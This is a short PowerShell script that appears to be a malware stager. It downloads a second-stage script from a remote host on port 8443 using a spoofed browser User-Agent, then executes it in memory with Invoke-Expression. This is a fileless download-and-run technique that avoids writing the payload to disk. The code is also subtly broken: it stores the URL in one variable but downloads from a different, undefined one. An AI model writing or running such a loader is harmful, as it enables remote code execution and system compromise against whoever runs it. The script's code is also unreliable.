
$Stage2Url = "https://adatum.com:8443/stage2.ps1"
$TimeoutSec = 66
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $StageScript = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($StageScript)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $StageScript.Length)
    Invoke-Expression $StageScript
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
Start-Sleep -Seconds 45
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
